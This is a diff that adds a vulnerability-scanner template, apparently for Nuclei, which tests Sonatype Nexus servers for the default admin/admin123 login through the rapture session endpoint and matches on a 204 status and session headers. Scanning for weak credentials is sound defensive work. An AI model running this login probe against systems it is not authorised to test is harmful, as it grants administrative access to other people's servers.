@@ -1,0 +1,41 @@
+http:
+    - attack: pitchfork
+      matchers:
+        - status:
+            - 204
+          type: status
+        - condition: and
+          part: header
+          type: word
+          words:
+            - 'Server: Nexus'
+            - NXSESSIONID
+      matchers-condition: and
+      payloads:
+        password:
+            - admin123
+        username:
+            - admin
+      raw:
+        - |
+          POST /service/rapture/session HTTP/1.1
+          Host: {{Hostname}}
+          X-Nexus-UI: true
+          Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+          username={{base64(username)}}&password={{base64(password)}}
+id: nexus-default-login
+info:
+    author: pikpikcu
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+        cvss-score: 8.3
+        cwe-id: CWE-522
+    description: Nexus default admin credentials were discovered.
+    metadata:
+        max-request: 1
+    name: Nexus Default Login
+    severity: high
+    tags:
+        - nexus
+        - default-login
